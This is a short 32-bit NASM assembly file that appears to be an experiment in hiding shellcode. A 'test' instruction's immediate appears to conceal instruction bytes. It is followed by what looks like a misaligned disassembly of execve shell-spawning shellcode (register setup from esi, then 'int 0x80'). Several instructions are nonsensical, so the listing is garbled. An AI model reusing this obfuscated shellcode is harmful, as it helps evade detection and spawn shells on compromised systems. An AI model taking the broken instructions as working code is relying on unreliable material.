BITS 32
global _start

section .data
lol dd 30


section .text

_start:


;lea ebx, [lol]
;add ebx, 0x3fcefe3a
;mov eax, 0


test dword [ebx+eax*4-0x3fcefe3a], 0x89087689          


inc esi
or al, 0xb8
or eax, [eax]
add [eax], eax
lea ebx, [esi]
lea ecx, [esi+0x8]
lea edx, [esi+0xc]
int 0x80
add [eax], al
add [edi], ch
